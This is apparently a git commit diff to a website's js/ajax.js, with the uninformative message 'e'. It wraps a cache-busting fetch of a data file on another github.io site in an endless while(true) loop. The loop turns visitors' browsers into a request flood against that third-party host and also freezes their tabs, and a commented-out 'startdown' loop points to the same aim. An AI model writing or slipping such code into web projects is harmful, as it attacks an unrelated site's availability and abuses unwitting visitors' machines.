d67e5af23c602ab741f33ec13765b455a873d172
Boof <97455552+hexahigh@users.noreply.github.com>
2023-01-18 13:49:51 +0100

    e

--- js/ajax.js
+++ js/ajax.js
@@ -40,13 +40,14 @@ const controller = new AbortController()
 // 5 second timeout:
 
 const timeoutId = setTimeout(() => controller.abort(), 5000)
-
-fetch('https://t0m0t0w.github.io/backuprr/history.dat', {cache: "no-store"}, { signal: controller.signal }).then(response => {
+while(true){
+  fetch('https://t0m0t0w.github.io/backuprr/history.dat', {cache: "no-store"}, { signal: controller.signal }).then(response => {
   // completed request before timeout fired
 
   // If you only wanted to timeout the request, not the response, add:
   // clearTimeout(timeoutId)
-})
+  })
+}
 /*window.onload = async function startdown(){
   while(true) {
     //await delay(10);
